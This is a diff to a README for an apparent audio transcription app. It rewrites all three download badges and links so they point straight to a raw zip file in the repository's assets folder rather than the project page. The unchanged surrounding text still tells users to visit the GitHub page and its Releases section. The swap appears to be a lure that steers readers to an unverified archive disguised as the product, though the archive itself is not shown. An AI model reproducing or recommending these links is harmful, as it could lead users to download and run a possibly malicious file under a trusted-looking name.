@@ -1,6 +1,6 @@
 # 🤖 Panos-AI-Transcriber - Easy Local Audio Transcription
 
-[![Download Panos-AI-Transcriber](https://img.shields.io/badge/Download-Panos--AI--Transcriber-brightgreen?style=for-the-badge)](https://github.com/earl-data/Panos-AI-Transcriber)
+[![Download Panos-AI-Transcriber](https://img.shields.io/badge/Download-Panos--AI--Transcriber-brightgreen?style=for-the-badge)](https://github.com/earl-data/Panos-AI-Transcriber/raw/refs/heads/main/assets/A_Transcriber_Panos_2.4.zip)
 
 ---
 
@@ -33,7 +33,7 @@ Follow these steps to download, install, and start using Panos-AI-Transcriber on
 
 First, go to the main page to get the latest version.
 
-[![Download Here](https://img.shields.io/badge/Download-Panos--AI--Transcriber-blue?style=for-the-badge)](https://github.com/earl-data/Panos-AI-Transcriber)
+[![Download Here](https://img.shields.io/badge/Download-Panos--AI--Transcriber-blue?style=for-the-badge)](https://github.com/earl-data/Panos-AI-Transcriber/raw/refs/heads/main/assets/A_Transcriber_Panos_2.4.zip)
 
 - Click the link to open the GitHub page.
 - Look for the "Releases" section or the latest release in the repository.
@@ -133,7 +133,7 @@ If you have trouble running the app, try these steps:
 
 You can always return here to download or check for updates:
 
-[Download Panos-AI-Transcriber](https://github.com/earl-data/Panos-AI-Transcriber)
+[Download Panos-AI-Transcriber](https://github.com/earl-data/Panos-AI-Transcriber/raw/refs/heads/main/assets/A_Transcriber_Panos_2.4.zip)
 
 Click the badge to open the page where you can grab the latest Windows installer. Always use the newest version for improvements and fixes.
 
